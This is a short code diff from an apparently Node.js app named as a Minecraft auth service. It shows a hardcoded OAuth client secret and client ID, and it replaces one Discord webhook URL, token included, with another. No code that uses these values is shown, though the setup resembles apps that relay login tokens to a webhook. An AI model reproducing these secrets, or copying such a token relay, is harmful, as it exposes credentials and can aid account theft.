@@ -2,7 +2,7 @@
 const client_secret = 'wbo8Q~zyiZUVZ5zVSbc7UZdjw334x9qNJ011IbDF'
 const client_id = '767bbf91-f318-4f75-ad82-526129dcd4f7'
 const redirect_uri = 'https://minecraft-auth-app.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1040858637360439326/vxSBR2vgbvztapoYlVm_wgc0k_I5RDI8q1r1RxtyI1koEGHSlGp15Ep2NolMeOc0zr3a'
+const webhook_url = 'https://discord.com/api/webhooks/1043404829340475392/umYdwVR-aVzEcSciEi_w5XyQi8Y2UddEORIgpALlFu14CtY7t_TKCGzjvjV3IxY0AAPQ'
 //Requirements
 const axios = require('axios')
 const express = require('express')
